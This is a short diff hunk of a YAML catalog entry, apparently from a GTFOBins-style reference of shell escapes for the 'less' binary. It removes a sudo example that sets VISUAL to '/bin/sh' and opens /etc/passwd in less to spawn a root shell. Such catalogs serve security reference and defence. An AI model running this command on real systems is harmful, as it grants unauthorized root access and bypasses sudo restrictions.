@@ -36,9 +36,6 @@ functions:
       v
     contexts:
       sudo:
-        code: |-
-          sudo VISUAL="/bin/sh -c '/bin/sh'" less /etc/passwd
-          v
       suid:
         shell: true
       unprivileged:
